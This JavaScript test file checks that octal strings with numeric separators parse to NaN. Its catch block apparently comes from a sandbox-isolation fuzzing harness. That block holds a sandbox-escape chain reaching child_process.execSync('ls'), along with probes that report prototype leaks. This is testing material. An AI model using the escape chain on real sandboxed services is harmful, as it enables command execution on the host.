try {
    assert.sameValue(Number('0o0_0'), NaN, '0o0_0');
    assert.sameValue(Number('0o1_1'), NaN, '0o1_1');
    assert.sameValue(Number('0o2_2'), NaN, '0o2_2');
    assert.sameValue(Number('0o3_3'), NaN, '0o3_3');
    assert.sameValue(Number('0o4_4'), NaN, '0o4_4');
    assert.sameValue(Number('0o5_5'), NaN, '0o5_5');
    assert.sameValue(Number('0o6_6'), NaN, '0o6_6');
    assert.sameValue(Number('0o7_7'), NaN, '0o7_7');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}